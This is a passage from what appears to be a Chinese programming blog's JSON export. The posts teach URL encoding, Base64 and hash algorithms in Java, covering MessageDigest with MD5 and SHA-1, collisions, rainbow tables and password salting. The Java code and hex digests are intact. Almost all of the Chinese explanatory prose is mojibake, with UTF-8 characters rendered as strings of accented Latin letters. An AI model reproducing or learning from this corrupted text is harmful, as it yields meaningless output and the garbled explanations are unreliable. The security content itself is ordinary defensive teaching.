‡å‡†è¦æ±‚ç©ºæ ¼è¢«ç¼–ç ä¸º%20ï¼Œä¸è¿‡ï¼ŒæœåŠ¡å™¨éƒ½å¯ä»¥å¤„ç†è¿™ä¸¤ç§æƒ…å†µã€‚ å¦‚æœæœåŠ¡å™¨æ”¶åˆ°URLç¼–ç çš„å­—ç¬¦ä¸²ï¼Œå°±å¯ä»¥å¯¹å…¶è¿›è¡Œè§£ç ï¼Œè¿˜åŸæˆåŸå§‹å­—ç¬¦ä¸²ã€‚Javaæ ‡å‡†åº“çš„URLDecoderå°±å¯ä»¥è§£ç ï¼š public class Main { public static void main(String[] args) { String decoded = URLDecoder.decode(&quot;%E4%B8%AD%E6%96%87%21&quot;, StandardCharsets.UTF_8); System.out.println(decoded); } } è¦ç‰¹åˆ«æ³¨æ„ï¼šURLç¼–ç æ˜¯ç¼–ç ç®—æ³•ï¼Œä¸æ˜¯åŠ å¯†ç®—æ³•ã€‚URLç¼–ç çš„ç›®çš„æ˜¯æŠŠä»»æ„æ–‡æœ¬æ•°æ®ç¼–ç ä¸º%å‰ç¼€è¡¨ç¤ºçš„æ–‡æœ¬ï¼Œç¼–ç åçš„æ–‡æœ¬ä»…åŒ…å«A~Zï¼Œa~zï¼Œ0~9ï¼Œ-ï¼Œ_ï¼Œ.ï¼Œ*å’Œ%ï¼Œä¾¿äºæµè§ˆå™¨å’ŒæœåŠ¡å™¨å¤„ç†ã€‚ Base64ç¼–ç URLç¼–ç æ˜¯å¯¹å­—ç¬¦è¿›è¡Œç¼–ç ï¼Œè¡¨ç¤ºæˆ%xxçš„å½¢å¼ï¼Œè€ŒBase64ç¼–ç æ˜¯å¯¹äºŒè¿›åˆ¶æ•°æ®è¿›è¡Œç¼–ç ï¼Œè¡¨ç¤ºæˆæ–‡æœ¬æ ¼å¼ã€‚ Base64ç¼–ç å¯ä»¥æŠŠä»»æ„é•¿åº¦çš„äºŒè¿›åˆ¶æ•°æ®å˜ä¸ºçº¯æ–‡æœ¬ï¼Œä¸”åªåŒ…å«A~Zã€a~zã€0~9ã€+ã€/ã€=è¿™äº›å­—ç¬¦ã€‚å®ƒçš„åŸç†æ˜¯æŠŠ3å­—èŠ‚çš„äºŒè¿›åˆ¶æ•°æ®æŒ‰6bitä¸€ç»„ï¼Œç”¨4ä¸ªintæ•´æ•°è¡¨ç¤ºï¼Œç„¶åæŸ¥è¡¨ï¼ŒæŠŠintæ•´æ•°ç”¨ç´¢å¼•å¯¹åº”åˆ°å­—ç¬¦ï¼Œå¾—åˆ°ç¼–ç åçš„å­—ç¬¦ä¸²ã€‚ ä¸¾ä¸ªä¾‹å­ï¼š3ä¸ªbyteæ•°æ®åˆ†åˆ«æ˜¯e4ã€b8ã€adï¼ŒæŒ‰6bitåˆ†ç»„å¾—åˆ°39ã€0bã€22å’Œ2dï¼š â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ e4 â”‚ b8 â”‚ ad â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”Œâ”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â” â”‚1â”‚1â”‚1â”‚0â”‚0â”‚1â”‚0â”‚0â”‚1â”‚0â”‚1â”‚1â”‚1â”‚0â”‚0â”‚0â”‚1â”‚0â”‚1â”‚0â”‚1â”‚1â”‚0â”‚1â”‚ â””â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”˜ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ 39 â”‚ 0b â”‚ 22 â”‚ 2d â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ å› ä¸º6ä½æ•´æ•°çš„èŒƒå›´æ€»æ˜¯0~63ï¼Œæ‰€ä»¥ï¼Œèƒ½ç”¨64ä¸ªå­—ç¬¦è¡¨ç¤ºï¼šå­—ç¬¦A~Zå¯¹åº”ç´¢å¼•0~25ï¼Œå­—ç¬¦a~zå¯¹åº”ç´¢å¼•26~51ï¼Œå­—ç¬¦0~9å¯¹åº”ç´¢å¼•52~61ï¼Œæœ€åä¸¤ä¸ªç´¢å¼•62ã€63åˆ†åˆ«ç”¨å­—ç¬¦+å’Œ/è¡¨ç¤ºã€‚ åœ¨Javaä¸­ï¼ŒäºŒè¿›åˆ¶æ•°æ®å°±æ˜¯byte[]æ•°ç»„ã€‚Javaæ ‡å‡†åº“æä¾›äº†Base64æ¥å¯¹byte[]æ•°ç»„è¿›è¡Œç¼–è§£ç ï¼š public class Main { public static void main(String[] args) { byte[] input = new byte[] { (byte) 0xe4, (byte) 0xb8, (byte) 0xad }; String b64encoded = Base64.getEncoder().encodeToString(input); System.out.println(b64encoded); } } ç¼–ç åå¾—åˆ°5Lit4ä¸ªå­—ç¬¦ã€‚è¦å¯¹Base64è§£ç ï¼Œä»ç„¶ç”¨Base64è¿™ä¸ªç±»ï¼š public class Main { public static void main(String[] args) { byte[] output = Base64.getDecoder().decode(&quot;5Lit&quot;); System.out.println(Arrays.toString(output)); // [-28, -72, -83] } } æœ‰çš„ç«¥é‹ä¼šé—®ï¼šå¦‚æœè¾“å…¥çš„byte[]æ•°ç»„é•¿åº¦ä¸æ˜¯3çš„æ•´æ•°å€è‚¿ä¹ˆåŠï¼Ÿè¿™ç§æƒ…å†µä¸‹ï¼Œéœ€è¦å¯¹è¾“å…¥çš„æœ«å°¾è¡¥ä¸€ä¸ªæˆ–ä¸¤ä¸ª0x00ï¼Œç¼–ç åï¼Œåœ¨ç»“å°¾åŠ ä¸€ä¸ª=è¡¨ç¤ºè¡¥å……äº†1ä¸ª0x00ï¼ŒåŠ ä¸¤ä¸ª=è¡¨ç¤ºè¡¥å……äº†2ä¸ª0x00ï¼Œè§£ç çš„æ—¶å€™ï¼Œå»æ‰æœ«å°¾è¡¥å……çš„ä¸€ä¸ªæˆ–ä¸¤ä¸ª0x00å³å¯ã€‚ å®é™…ä¸Šï¼Œå› ä¸ºç¼–ç åçš„é•¿åº¦åŠ ä¸Š=æ€»æ˜¯4çš„å€æ•°ï¼Œæ‰€ä»¥å³ä½¿ä¸åŠ =ä¹Ÿå¯ä»¥è®¡ç®—å‡ºåŸå§‹è¾“å…¥çš„byte[]ã€‚Base64ç¼–ç çš„æ—¶å€™å¯ä»¥ç”¨withoutPadding()å»æ‰=ï¼Œè§£ç å‡ºæ¥çš„ç»“æœæ˜¯ä¸€æ ·çš„ï¼š public class Main { public static void main(String[] args) { byte[] input = new byte[] { (byte) 0xe4, (byte) 0xb8, (byte) 0xad, 0x21 }; String b64encoded = Base64.getEncoder().encodeToString(input); String b64encoded2 = Base64.getEncoder().withoutPadding().encodeToString(input); System.out.println(b64encoded); System.out.println(b64encoded2); byte[] output = Base64.getDecoder().decode(b64encoded2); System.out.println(Arrays.toString(output)); } } å› ä¸ºæ ‡å‡†çš„Base64ç¼–ç ä¼šå‡ºç°+ã€/å’Œ=ï¼Œæ‰€ä»¥ä¸é€‚åˆæŠŠBase64ç¼–ç åçš„å­—ç¬¦ä¸²æ”¾åˆ°URLä¸­ã€‚ä¸€ç§é’ˆå¯¹URLçš„Base64ç¼–ç å¯ä»¥åœ¨URLä¸­ä½¿ç”¨çš„Base64ç¼–ç ï¼Œå®ƒä»…ä»…æ˜¯æŠŠ+å˜æˆ-ï¼Œ/å˜æˆ_ï¼š public class Main { public static void main(String[] args) { byte[] input = new byte[] { 0x01, 0x02, 0x7f, 0x00 }; String b64encoded = Base64.getUrlEncoder().encodeToString(input); System.out.println(b64encoded); byte[] output = Base64.getUrlDecoder().decode(b64encoded); System.out.println(Arrays.toString(output)); } } Base64ç¼–ç çš„ç›®çš„æ˜¯æŠŠäºŒè¿›åˆ¶æ•°æ®å˜æˆæ–‡æœ¬æ ¼å¼ï¼Œè¿™æ ·åœ¨å¾ˆå¤šæ–‡æœ¬ä¸­å°±å¯ä»¥å¤„ç†äºŒè¿›åˆ¶æ•°æ®ã€‚ä¾‹å¦‚ï¼Œç”µå­é‚®ä»¶åè®®å°±æ˜¯æ–‡æœ¬åè®®ï¼Œå¦‚æœè¦åœ¨ç”µå­é‚®ä»¶ä¸­æ·»åŠ ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°±å¯ä»¥ç”¨Base64ç¼–ç ï¼Œç„¶åä»¥æ–‡æœ¬çš„å½¢å¼ä¼ é€ã€‚ Base64ç¼–ç çš„ç¼ºç‚¹æ˜¯ä¼ è¾“æ•ˆç‡ä¼šé™ä½ï¼Œå› ä¸ºå®ƒæŠŠåŸå§‹æ•°æ®çš„é•¿åº¦å¢åŠ äº†1/3ã€‚ å’ŒURLç¼–ç ä¸€æ ·ï¼ŒBase64ç¼–ç æ˜¯ä¸€ç§ç¼–ç ç®—æ³•ï¼Œä¸æ˜¯åŠ å¯†ç®—æ³•ã€‚ å¦‚æœæŠŠBase64çš„64ä¸ªå­—ç¬¦ç¼–ç è¡¨æ¢æˆ32ä¸ªã€48ä¸ªæˆ–è€…58ä¸ªï¼Œå°±å¯ä»¥ä½¿ç”¨Base32ç¼–ç ï¼ŒBase48ç¼–ç å’ŒBase58ç¼–ç ã€‚å­—ç¬¦è¶Šå°‘ï¼Œç¼–ç çš„æ•ˆç‡å°±ä¼šè¶Šä½ã€‚ å°ç»“URLç¼–ç å’ŒBase64ç¼–ç éƒ½æ˜¯ç¼–ç ç®—æ³•ï¼Œå®ƒä»¬ä¸æ˜¯åŠ å¯†ç®—æ³•ï¼› URLç¼–ç çš„ç›®çš„æ˜¯æŠŠä»»æ„æ–‡æœ¬æ•°æ®ç¼–ç ä¸º%å‰ç¼€è¡¨ç¤ºçš„æ–‡æœ¬ï¼Œä¾¿äºæµè§ˆå™¨å’ŒæœåŠ¡å™¨å¤„ç†ï¼› Base64ç¼–ç çš„ç›®çš„æ˜¯æŠŠä»»æ„äºŒè¿›åˆ¶æ•°æ®ç¼–ç ä¸ºæ–‡æœ¬ï¼Œä½†ç¼–ç åæ•°æ®é‡ä¼šå¢åŠ 1/3ã€‚","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://blog.kayleh.top/tags/algorithm/"}]},{"title":"hash algorithm","slug":"å“ˆå¸Œç®—æ³•","date":"2020-06-17T02:03:58.000Z","updated":"2021-04-11T17:11:28.804Z","comments":true,"path":"å“ˆå¸Œç®—æ³•/","link":"","permalink":"https://blog.kayleh.top/%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95/","excerpt":"å“ˆå¸Œç®—æ³• å“ˆå¸Œç®—æ³•ï¼ˆHashï¼‰åˆç§°æ‘˜è¦ç®—æ³•ï¼ˆDigestï¼‰ï¼Œå®ƒçš„ä½œç”¨æ˜¯ï¼šå¯¹ä»»æ„ä¸€ç»„è¾“å…¥æ•°æ®è¿›è¡Œè®¡ç®—ï¼Œå¾—åˆ°ä¸€ä¸ªå›ºå®šé•¿åº¦çš„è¾“å‡ºæ‘˜è¦ã€‚","text":"å“ˆå¸Œç®—æ³• å“ˆå¸Œç®—æ³•ï¼ˆHashï¼‰åˆç§°æ‘˜è¦ç®—æ³•ï¼ˆDigestï¼‰ï¼Œå®ƒçš„ä½œç”¨æ˜¯ï¼šå¯¹ä»»æ„ä¸€ç»„è¾“å…¥æ•°æ®è¿›è¡Œè®¡ç®—ï¼Œå¾—åˆ°ä¸€ä¸ªå›ºå®šé•¿åº¦çš„è¾“å‡ºæ‘˜è¦ã€‚ å“ˆå¸Œç®—æ³•æœ€é‡è¦çš„ç‰¹ç‚¹å°±æ˜¯ï¼š ç›¸åŒçš„è¾“å…¥ä¸€å®šå¾—åˆ°ç›¸åŒçš„è¾“å‡ºï¼› ä¸åŒçš„è¾“å…¥å¤§æ¦‚ç‡å¾—åˆ°ä¸åŒçš„è¾“å‡ºã€‚ å“ˆå¸Œç®—æ³•çš„ç›®çš„å°±æ˜¯ä¸ºäº†éªŒè¯åŸå§‹æ•°æ®æ˜¯å¦è¢«ç¯¡æ”¹ã€‚ Javaå­—ç¬¦ä¸²çš„hashCode()å°±æ˜¯ä¸€ä¸ªå“ˆå¸Œç®—æ³•ï¼Œå®ƒçš„è¾“å…¥æ˜¯ä»»æ„å­—ç¬¦ä¸²ï¼Œè¾“å‡ºæ˜¯å›ºå®šçš„4å­—èŠ‚intæ•´æ•°ï¼š &quot;hello&quot;.hashCode(); // 0x5e918d2 &quot;hello, java&quot;.hashCode(); // 0x7a9d88e8 &quot;hello, bob&quot;.hashCode(); // 0xa0dbae2f ä¸¤ä¸ªç›¸åŒçš„å­—ç¬¦ä¸²æ°¸è¿œä¼šè®¡ç®—å‡ºç›¸åŒçš„hashCodeï¼Œå¦åˆ™åŸºäºhashCodeå®šä½çš„HashMapå°±æ— æ³•æ­£å¸¸å·¥ä½œã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå½“æˆ‘ä»¬è‡ªå®šä¹‰ä¸€ä¸ªclassæ—¶ï¼Œè¦†å†™equals()æ–¹æ³•æ—¶æˆ‘ä»¬å¿…é¡»æ­£ç¡®è¦†å†™hashCode()æ–¹æ³•ã€‚ å“ˆå¸Œç¢°æ’å“ˆå¸Œç¢°æ’æ˜¯æŒ‡ï¼Œä¸¤ä¸ªä¸åŒçš„è¾“å…¥å¾—åˆ°äº†ç›¸åŒçš„è¾“å‡ºï¼š &quot;AaAaAa&quot;.hashCode(); // 0x7460e8c0 &quot;BBAaBB&quot;.hashCode(); // 0x7460e8c0 æœ‰ç«¥é‹ä¼šé—®ï¼šç¢°æ’èƒ½ä¸èƒ½é¿å…ï¼Ÿç­”æ¡ˆæ˜¯ä¸èƒ½ã€‚ç¢°æ’æ˜¯ä¸€å®šä¼šå‡ºç°çš„ï¼Œå› ä¸ºè¾“å‡ºçš„å­—èŠ‚é•¿åº¦æ˜¯å›ºå®šçš„ï¼ŒStringçš„hashCode()è¾“å‡ºæ˜¯4å­—èŠ‚æ•´æ•°ï¼Œæœ€å¤šåªæœ‰4294967296ç§è¾“å‡ºï¼Œä½†è¾“å…¥çš„æ•°æ®é•¿åº¦æ˜¯ä¸å›ºå®šçš„ï¼Œæœ‰æ— æ•°ç§è¾“å…¥ã€‚æ‰€ä»¥ï¼Œå“ˆå¸Œç®—æ³•æ˜¯æŠŠä¸€ä¸ªæ— é™çš„è¾“å…¥é›†åˆæ˜ å°„åˆ°ä¸€ä¸ªæœ‰é™çš„è¾“å‡ºé›†åˆï¼Œå¿…ç„¶ä¼šäº§ç”Ÿç¢°æ’ã€‚ ç¢°æ’ä¸å¯æ€•ï¼Œæˆ‘ä»¬æ‹…å¿ƒçš„ä¸æ˜¯ç¢°æ’ï¼Œè€Œæ˜¯ç¢°æ’çš„æ¦‚ç‡ï¼Œå› ä¸ºç¢°æ’æ¦‚ç‡çš„é«˜ä½å…³ç³»åˆ°å“ˆå¸Œç®—æ³•çš„å®‰å…¨æ€§ã€‚ä¸€ä¸ªå®‰å…¨çš„å“ˆå¸Œç®—æ³•å¿…é¡»æ»¡è¶³ï¼š ç¢°æ’æ¦‚ç‡ä½ï¼› ä¸èƒ½çŒœæµ‹è¾“å‡ºã€‚ ä¸èƒ½çŒœæµ‹è¾“å‡ºæ˜¯æŒ‡ï¼Œè¾“å…¥çš„ä»»æ„ä¸€ä¸ªbitçš„å˜åŒ–ä¼šé€ æˆè¾“å‡ºå®Œå…¨ä¸åŒï¼Œè¿™æ ·å°±å¾ˆéš¾ä»è¾“å‡ºåæ¨è¾“å…¥ï¼ˆåªèƒ½ä¾é æš´åŠ›ç©·ä¸¾ï¼‰ã€‚å‡è®¾ä¸€ç§å“ˆå¸Œç®—æ³•æœ‰å¦‚ä¸‹è§„å¾‹ï¼š hashA(&quot;java001&quot;) = &quot;123456&quot; hashA(&quot;java002&quot;) = &quot;123457&quot; hashA(&quot;java003&quot;) = &quot;123458&quot; é‚£ä¹ˆå¾ˆå®¹æ˜“ä»è¾“å‡º123459åæ¨è¾“å…¥ï¼Œè¿™ç§å“ˆå¸Œç®—æ³•å°±ä¸å®‰å…¨ã€‚å®‰å…¨çš„å“ˆå¸Œç®—æ³•ä»è¾“å‡ºæ˜¯çœ‹ä¸å‡ºä»»ä½•è§„å¾‹çš„ï¼š hashB(&quot;java001&quot;) = &quot;123456&quot; hashB(&quot;java002&quot;) = &quot;580271&quot; hashB(&quot;java003&quot;) = ??? å¸¸ç”¨çš„å“ˆå¸Œç®—æ³•æœ‰ï¼š ç®—æ³• è¾“å‡ºé•¿åº¦ï¼ˆä½ï¼‰ è¾“å‡ºé•¿åº¦ï¼ˆå­—èŠ‚ï¼‰ MD5 128 bits 16 bytes SHA-1 160 bits 20 bytes RipeMD-160 160 bits 20 bytes SHA-256 256 bits 32 bytes SHA-512 512 bits 64 bytes æ ¹æ®ç¢°æ’æ¦‚ç‡ï¼Œå“ˆå¸Œç®—æ³•çš„è¾“å‡ºé•¿åº¦è¶Šé•¿ï¼Œå°±è¶Šéš¾äº§ç”Ÿç¢°æ’ï¼Œä¹Ÿå°±è¶Šå®‰å…¨ã€‚ Javaæ ‡å‡†åº“æä¾›äº†å¸¸ç”¨çš„å“ˆå¸Œç®—æ³•ï¼Œå¹¶ä¸”æœ‰ä¸€å¥—ç»Ÿä¸€çš„æ¥å£ã€‚æˆ‘ä»¬ä»¥MD5ç®—æ³•ä¸ºä¾‹ï¼Œçœ‹çœ‹å¦‚ä½•å¯¹è¾“å…¥è®¡ç®—å“ˆå¸Œï¼š public class Main { public static void main(String[] args) throws Exception { // åˆ›å»ºä¸€ä¸ªMessageDigestå®ä¾‹: MessageDigest md = MessageDigest.getInstance(&quot;MD5&quot;); // åå¤è°ƒç”¨updateè¾“å…¥æ•°æ®: md.update(&quot;Hello&quot;.getBytes(&quot;UTF-8&quot;)); md.update(&quot;World&quot;.getBytes(&quot;UTF-8&quot;)); byte[] result = md.digest(); // 16 bytes: 68e109f0f40ca72a15e05cc22786f8e6 System.out.println(new BigInteger(1, result).toString(16)); } } ä½¿ç”¨MessageDigestæ—¶ï¼Œæˆ‘ä»¬é¦–å…ˆæ ¹æ®å“ˆå¸Œç®—æ³•è·å–ä¸€ä¸ªMessageDigestå®ä¾‹ï¼Œç„¶åï¼Œåå¤è°ƒç”¨update(byte[])è¾“å…¥æ•°æ®ã€‚å½“è¾“å…¥ç»“æŸåï¼Œè°ƒç”¨digest()æ–¹æ³•è·å¾—byte[]æ•°ç»„è¡¨ç¤ºçš„æ‘˜è¦ï¼Œæœ€åï¼ŒæŠŠå®ƒè½¬æ¢ä¸ºåå…­è¿›åˆ¶çš„å­—ç¬¦ä¸²ã€‚ è¿è¡Œä¸Šè¿°ä»£ç ï¼Œå¯ä»¥å¾—åˆ°è¾“å…¥HelloWorldçš„MD5æ˜¯68e109f0f40ca72a15e05cc22786f8e6ã€‚ å“ˆå¸Œç®—æ³•çš„ç”¨é€”å› ä¸ºç›¸åŒçš„è¾“å…¥æ°¸è¿œä¼šå¾—åˆ°ç›¸åŒçš„è¾“å‡ºï¼Œå› æ­¤ï¼Œå¦‚æœè¾“å…¥è¢«ä¿®æ”¹äº†ï¼Œå¾—åˆ°çš„è¾“å‡ºå°±ä¼šä¸åŒã€‚ æˆ‘ä»¬åœ¨ç½‘ç«™ä¸Šä¸‹è½½è½¯ä»¶çš„æ—¶å€™ï¼Œç»å¸¸çœ‹åˆ°ä¸‹è½½é¡µæ˜¾ç¤ºçš„å“ˆå¸Œï¼š file-md5 å¦‚ä½•åˆ¤æ–­ä¸‹è½½åˆ°æœ¬åœ°çš„è½¯ä»¶æ˜¯åŸå§‹çš„ã€æœªç»ç¯¡æ”¹çš„æ–‡ä»¶ï¼Ÿæˆ‘ä»¬åªéœ€è¦è‡ªå·±è®¡ç®—ä¸€ä¸‹æœ¬åœ°æ–‡ä»¶çš„å“ˆå¸Œå€¼ï¼Œå†ä¸å®˜ç½‘å…¬å¼€çš„å“ˆå¸Œå€¼å¯¹æ¯”ï¼Œå¦‚æœç›¸åŒï¼Œè¯´æ˜æ–‡ä»¶ä¸‹è½½æ­£ç¡®ï¼Œå¦åˆ™ï¼Œè¯´æ˜æ–‡ä»¶å·²è¢«ç¯¡æ”¹ã€‚ å“ˆå¸Œç®—æ³•çš„å¦ä¸€ä¸ªé‡è¦ç”¨é€”æ˜¯å­˜å‚¨ç”¨æˆ·å£ä»¤ã€‚å¦‚æœç›´æ¥å°†ç”¨æˆ·çš„åŸå§‹å£ä»¤å­˜æ”¾åˆ°æ•°æ®åº“ä¸­ï¼Œä¼šäº§ç”Ÿæå¤§çš„å®‰å…¨é£é™©ï¼š æ•°æ®åº“ç®¡ç†å‘˜èƒ½å¤Ÿçœ‹åˆ°ç”¨æˆ·æ˜æ–‡å£ä»¤ï¼› æ•°æ®åº“æ•°æ®ä¸€æ—¦æ³„æ¼ï¼Œé»‘å®¢å³å¯è·å–ç”¨æˆ·æ˜æ–‡å£ä»¤ã€‚ ä¸å­˜å‚¨ç”¨æˆ·çš„åŸå§‹å£ä»¤ï¼Œé‚£ä¹ˆå¦‚ä½•å¯¹ç”¨æˆ·è¿›è¡Œè®¤è¯ï¼Ÿ æ–¹æ³•æ˜¯å­˜å‚¨ç”¨æˆ·å£ä»¤çš„å“ˆå¸Œï¼Œä¾‹å¦‚ï¼ŒMD5ã€‚ åœ¨ç”¨æˆ·è¾“å…¥åŸå§‹å£ä»¤åï¼Œç³»ç»Ÿè®¡ç®—ç”¨æˆ·è¾“å…¥çš„åŸå§‹å£ä»¤çš„MD5å¹¶ä¸æ•°æ®åº“å­˜å‚¨çš„MD5å¯¹æ¯”ï¼Œå¦‚æœä¸€è‡´ï¼Œè¯´æ˜å£ä»¤æ­£ç¡®ï¼Œå¦åˆ™ï¼Œå£ä»¤é”™è¯¯ã€‚ å› æ­¤ï¼Œæ•°æ®åº“å­˜å‚¨ç”¨æˆ·åå’Œå£ä»¤çš„è¡¨å†…å®¹åº”è¯¥åƒä¸‹é¢è¿™æ ·ï¼š username password bob f30aa7a662c728b7407c54ae6bfd27d1 alice 25d55ad283aa400af464c76d713c07ad tim bed128365216c019988915ed3add75fb è¿™æ ·ä¸€æ¥ï¼Œæ•°æ®åº“ç®¡ç†å‘˜çœ‹ä¸åˆ°ç”¨æˆ·çš„åŸå§‹å£ä»¤ã€‚å³ä½¿æ•°æ®åº“æ³„æ¼ï¼Œé»‘å®¢ä¹Ÿæ— æ³•æ‹¿åˆ°ç”¨æˆ·çš„åŸå§‹å£ä»¤ã€‚æƒ³è¦æ‹¿åˆ°ç”¨æˆ·çš„åŸå§‹å£ä»¤ï¼Œå¿…é¡»ç”¨æš´åŠ›ç©·ä¸¾çš„æ–¹æ³•ï¼Œä¸€ä¸ªå£ä»¤ä¸€ä¸ªå£ä»¤åœ°è¯•ï¼Œç›´åˆ°æŸä¸ªå£ä»¤è®¡ç®—çš„MD5æ°å¥½ç­‰äºæŒ‡å®šå€¼ã€‚ ä½¿ç”¨å“ˆå¸Œå£ä»¤æ—¶ï¼Œè¿˜è¦æ³¨æ„é˜²æ­¢å½©è™¹è¡¨æ”»å‡»ã€‚ ä»€ä¹ˆæ˜¯å½©è™¹è¡¨å‘¢ï¼Ÿä¸Šé¢è®²åˆ°äº†ï¼Œå¦‚æœåªæ‹¿åˆ°MD5ï¼Œä»MD5åæ¨æ˜æ–‡å£ä»¤ï¼Œåªèƒ½ä½¿ç”¨æš´åŠ›ç©·ä¸¾çš„æ–¹æ³•ã€‚ ç„¶è€Œé»‘å®¢å¹¶ä¸ç¬¨ï¼Œæš´åŠ›ç©·ä¸¾ä¼šæ¶ˆè€—å¤§é‡çš„ç®—åŠ›å’Œæ—¶é—´ã€‚ä½†æ˜¯ï¼Œå¦‚æœæœ‰ä¸€ä¸ªé¢„å…ˆè®¡ç®—å¥½çš„å¸¸ç”¨å£ä»¤å’Œå®ƒä»¬çš„MD5çš„å¯¹ç…§è¡¨ï¼š å¸¸ç”¨å£ä»¤ MD5 hello123 f30aa7a662c728b7407c54ae6bfd27d1 12345678 25d55ad283aa400af464c76d713c07ad passw0rd bed128365216c019988915ed3add75fb 19700101 570da6d5277a646f6552b8832012f5dc â€¦ â€¦ 20201231 6879c0ae9117b50074ce0a0d4c843060 è¿™ä¸ªè¡¨å°±æ˜¯å½©è™¹è¡¨ã€‚å¦‚æœç”¨æˆ·ä½¿ç”¨äº†å¸¸ç”¨å£ä»¤ï¼Œé»‘å®¢ä»MD5ä¸€ä¸‹å°±èƒ½åæŸ¥åˆ°åŸå§‹å£ä»¤ï¼š bobçš„MD5ï¼šf30aa7a662c728b7407c54ae6bfd27d1ï¼ŒåŸå§‹å£ä»¤ï¼šhello123ï¼› aliceçš„MD5ï¼š25d55ad283aa400af464c76d713c07adï¼ŒåŸå§‹å£ä»¤ï¼š12345678ï¼› timçš„MD5ï¼šbed128365216c019988915ed3add75fbï¼ŒåŸå§‹å£ä»¤ï¼špassw0rdã€‚ è¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¸è¦ä½¿ç”¨å¸¸ç”¨å¯†ç ï¼Œä»¥åŠä¸è¦ä½¿ç”¨ç”Ÿæ—¥ä½œä¸ºå¯†ç çš„åŸå› ã€‚ å³ä½¿ç”¨æˆ·ä½¿ç”¨äº†å¸¸ç”¨å£ä»¤ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é‡‡å–æªæ–½æ¥æŠµå¾¡å½©è™¹è¡¨æ”»å‡»ï¼Œæ–¹æ³•æ˜¯å¯¹æ¯ä¸ªå£ä»¤é¢å¤–æ·»åŠ éšæœºæ•°ï¼Œè¿™ä¸ªæ–¹æ³•ç§°ä¹‹ä¸ºåŠ ç›ï¼ˆsaltï¼‰ï¼š digest = md5(salt+inputPassword) ç»è¿‡åŠ ç›å¤„ç†çš„æ•°æ®åº“è¡¨ï¼Œå†…å®¹å¦‚ä¸‹ï¼š username salt password bob H1r0a a5022319ff4c56955e22a74abcc2c210 alice 7$p2w e5de688c99e961ed6e560b972dab8b6a tim z5Sk9 1eee304b92dc0d105904e7ab58fd2f64 åŠ ç›çš„ç›®çš„åœ¨äºä½¿é»‘å®¢çš„å½©è™¹è¡¨å¤±æ•ˆï¼Œå³ä½¿ç”¨æˆ·ä½¿ç”¨å¸¸ç”¨å£ä»¤ï¼Œä¹Ÿæ— æ³•ä»MD5åæ¨åŸå§‹å£ä»¤ã€‚ SHA-1SHA-1ä¹Ÿæ˜¯ä¸€ç§å“ˆå¸Œç®—æ³•ï¼Œå®ƒçš„è¾“å‡ºæ˜¯160 bitsï¼Œå³20å­—èŠ‚ã€‚SHA-1æ˜¯ç”±ç¾å›½å›½å®¶å®‰å…¨å±€å¼€å‘çš„ï¼ŒSHAç®—æ³•å®é™…ä¸Šæ˜¯ä¸€ä¸ªç³»åˆ—ï¼ŒåŒ…æ‹¬SHA-0ï¼ˆå·²åºŸå¼ƒï¼‰ã€SHA-1ã€SHA-256ã€SHA-512ç­‰ã€‚ åœ¨Javaä¸­ä½¿ç”¨SHA-1ï¼Œå’ŒMD5å®Œå…¨ä¸€æ ·ï¼Œåªéœ€è¦æŠŠç®—æ³•åç§°æ”¹ä¸º&quot;SHA-1&quot;ï¼š public class Main { public static void main(String[] args) throws Exception { // åˆ›å»ºä¸€ä¸ªMessageDigestå®ä¾‹: MessageDigest md = MessageDigest.getInstance(&quot;SHA-1&quot;); // åå¤è°ƒç”¨updateè¾“å…¥æ•°æ®: md.update(&quot;Hello&quot;.getBytes(&quot;UTF-8&quot;)); md.update(&quot;World&quot;.getBytes(&quot;UTF-8&quot;)); byte[] result = md.digest(); // 20 bytes: db8ac1c259eb89d4a131b253bacfca5f319d54f2 System.out.println(new BigInteger(1, result).toString(16)); } } ç±»ä¼¼çš„ï¼Œè®¡ç®—SHA-256ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥åç§°&quot;SHA-256&quot;ï¼Œè®¡ç®—SHA-512ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥åç§°&quot;SHA-512&quot;ã€‚Javaæ 